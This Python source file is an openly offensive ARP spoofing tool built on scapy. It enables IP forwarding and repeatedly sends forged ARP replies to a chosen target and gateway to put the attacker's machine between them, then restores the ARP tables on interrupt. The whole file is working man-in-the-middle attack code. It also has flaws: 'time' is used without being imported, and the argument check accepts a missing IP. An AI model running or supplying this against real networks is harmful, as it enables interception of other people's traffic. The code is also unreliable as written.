import scapy.all as scapy
import sys
import argparse
from colorama import Fore, Back, Style

def print_intro():
    print(Fore.RED + """
          █████╗ ██████╗ ██████╗     ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗
         ██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
         ███████║██████╔╝██████╔╝    ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
         ██╔══██║██╔══██╗██╔═══╝     ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
         ██║  ██║██║  ██║██║         ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
         ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
     """ + Style.RESET_ALL)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Enter your default gateway IP (it may be 10.0.2.1).")
    options = parser.parse_args()
    return options

def enable_linux_ip_routing():
    """
        Enables IP Forwarding -- Linux
    """
    with open("/proc/sys/net/ipv4/ip_forward", 'w') as file:
        file.write("1")
    print(Fore.GREEN + '[+] IP routing enabled.' + Style.RESET_ALL)

def get_mac(ip):
    """
        Returns all MAC Adresses of all devices connected to the network
        - sends "Who is at ... " to all the devices connected to the network(broadcast)
        - receives "I'm at <MAC>"
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc.upper()

def spoof(target_ip, spoof_ip):
    """

    """
    target_mac = get_mac(target_ip)
    # op=2 means that it will send a response(not a request=1), pdst -> destination ip, hwst -> hardware destination(mac adress), psrc -> source ip (the router)
    # if hwsrc is not set ---> it will take my mac address
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(destination_ip, source_ip):
    """
        Restores the ARP table back to normal
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


if __name__ == "__main__":
    print_intro()
    options = get_arguments()
    if not (options.target_ip or options.gateway_ip):
        print(Fore.RED + "\n[!] Please enter the target IP and the gateway IP. Use --help for more info." + Style.RESET_ALL)
    else:
        enable_linux_ip_routing()
        print(Fore.GREEN + "[+] Spoofing attack is on!!! ---> Use" + Fore.RED + " CTRL + C" + Fore.GREEN + " to interrupt." + Style.RESET_ALL)
        packets_count = 0
        while True:
            try:
                spoof(options.target_ip, options.gateway_ip)
                spoof(options.gateway_ip, options.target_ip)
                packets_count += 2
                print(Fore.GREEN + f"\r[+] Packets sent: {packets_count}" + Style.RESET_ALL, sep=' ', end='', flush=True)
                time.sleep(2)
            except KeyboardInterrupt:
                print(Fore.RED + "\n[!] You interrupted the attack." + Style.RESET_ALL)
                restore(options.target_ip, options.gateway_ip)
                restore(options.gateway_ip, options.target_ip)
                print(Fore.CYAN + "\n[+]Resetting the ARP table...")
                time.sleep(1)
                print(Fore.CYAN + "[+] The ARP table is back to normal." + Style.RESET_ALL)
                break

